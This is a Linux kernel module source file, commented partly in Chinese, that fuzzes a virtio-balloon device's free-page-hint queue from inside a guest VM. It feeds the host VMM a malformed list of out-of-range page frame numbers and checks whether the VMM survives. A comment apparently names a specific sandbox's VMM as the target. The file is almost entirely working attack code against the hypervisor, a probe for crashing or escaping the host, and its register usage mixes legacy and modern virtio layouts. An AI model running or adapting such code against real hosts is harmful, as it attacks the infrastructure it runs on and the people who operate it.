#include <linux/module.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>

/* balloon @ 0xc0001000 (device id 5)
 * free_page_hint = queue index 2 (VIRTIO_BALLOON_VQ_FREE_PAGE)
 * 协议: cmd_id(u32) 先发, 然后 PFN 列表, 然后 cmd_id_stop
 * 特性: VIRTIO_BALLOON_F_FREE_PAGE_HINT (bit3) + F_HINT_WAIT_ON_ACK (bit6)
 */
#define BALLOON_BASE 0xc0001000UL
#define QSZ 32

struct vring_desc { u64 addr; u32 len; u16 flags; u16 next; };
struct vring_avail { u16 flags; u16 idx; u16 ring[QSZ]; u16 used_event; };
struct vring_used_elem { u32 id; u32 len; };
struct vring_used { u16 flags; u16 idx; struct vring_used_elem ring[QSZ]; u16 avail_event; };

static int __init fuzz3_init(void)
{
    void __iomem *b = ioremap(BALLOON_BASE, 4096);
    struct vring_desc *descs;
    struct vring_avail *avail;
    struct vring_used *used;
    u32 *pfn_buf, *cmd_buf;
    u32 v; int i;

    if (!b) { pr_err("fuzz3: ioremap fail\n"); return -ENOMEM; }
    pr_info("fuzz3: balloon @%lx Magic=%08x DevID=%08x\n",
            BALLOON_BASE, ioread32(b), ioread32(b+8));

    /* vring 内存（GPA 一致性：用 alloc_pages 保证物理连续+可转 GPA）*/
    descs = kzalloc(4096, GFP_KERNEL);
    avail = kzalloc(4096, GFP_KERNEL);
    used  = kzalloc(4096, GFP_KERNEL);
    pfn_buf = kzalloc(4096, GFP_KERNEL);
    cmd_buf = kzalloc(64, GFP_KERNEL);
    if (!descs || !avail || !used || !pfn_buf || !cmd_buf) { pr_err("alloc fail\n"); goto out; }

    /* 步骤1: ACKNOWLEDGE|DRIVER */
    iowrite32(0x07, b+0x3c); msleep(20);
    /* 步骤2: 协商特性 FREE_PAGE_HINT|PAGE_POISON|WAIT_ON_ACK (bit3|4|6) */
    iowrite32(0, b+0x14);                  /* GuestFeaturesSel=0 */
    iowrite32((1<<3)|(1<<4)|(1<<6), b+0x20); /* GuestFeatures */
    iowrite32(0x0b, b+0x3c); msleep(20);   /* +FEATURES_OK */
    v = ioread32(b+0x3c);
    pr_info("fuzz3: status=%08x (FEATURES_OK acked: %s)\n", v, (v&8)?"yes":"NO");
    if (!(v & 8)) { pr_err("features rejected\n"); goto out; }

    /* 步骤3: 配置 free_page_hint 队列 (index 2) */
    iowrite32(2, b+0x30);                  /* QueueSel=2 */
    v = ioread32(b+0x34);
    pr_info("fuzz3: q2 QueueNumMax=%u\n", v);
    if (v == 0) { pr_err("q2 not present (hint feature off?)\n"); goto out; }
    iowrite32(QSZ, b+0x38);                /* QueueNum */
    /* desc 表 GPA */
    iowrite32((u32)(virt_to_phys(descs) >> 12), b+0x40); /* legacy: QueuePFN = page frame */
    iowrite32(1, b+0x44);                  /* QueueReady=1 (modern) */

    /* 步骤4: 构造 descriptor 链 — cmd_id_start + PFN 畸形列表 */
    cmd_buf[0] = 0xdeadbeef;               /* cmd_id (任意值) */
    for (i = 0; i < 256; i++) pfn_buf[i] = 0xfffff000 + i; /* 越界 PFN 列表 */

    descs[0].addr = virt_to_phys(cmd_buf);
    descs[0].len = 4;
    descs[0].flags = 0;                    /* device-readable */
    descs[0].next = 1;
    descs[1].addr = virt_to_phys(pfn_buf);
    descs[1].len = 256*4;                  /* 256 个 PFN */
    descs[1].flags = 0;
    descs[1].next = 0;                     /* 链尾 */

    avail->idx = 1;
    avail->ring[0] = 0;                    /* head = desc 0 */

    /* 步骤5: DRIVER_OK + kick */
    iowrite32(0x0f, b+0x3c); msleep(20);
    iowrite32(2, b+0x50);                  /* QueueNotify=2 (free_page_vq) */
    pr_info("fuzz3: kicked free_page_vq with malformed PFNs\n");

    /* 步骤6: 等 ack（wait-on-ack 特性下 VMM 要回 used）*/
    for (i = 0; i < 20; i++) {
        msleep(100);
        if (used->idx > 0) {
            pr_info("fuzz3: ACK received! used.idx=%u id=%u\n",
                    used->idx, used->ring[0].id);
            break;
        }
    }
    if (used->idx == 0) pr_warn("fuzz3: no ACK in 2s (E2B ack path?)\n");

    /* 存活确认 */
    pr_info("fuzz3: still alive, Status=%08x\n", ioread32(b+0x3c));
    pr_info("FUZZ3-COMPLETE-VMM-SURVIVED\n");
out:
    if (b) iounmap(b);
    kfree(descs); kfree(avail); kfree(used); kfree(pfn_buf); kfree(cmd_buf);
    return 0;
}
module_init(fuzz3_init);
MODULE_LICENSE("GPL");
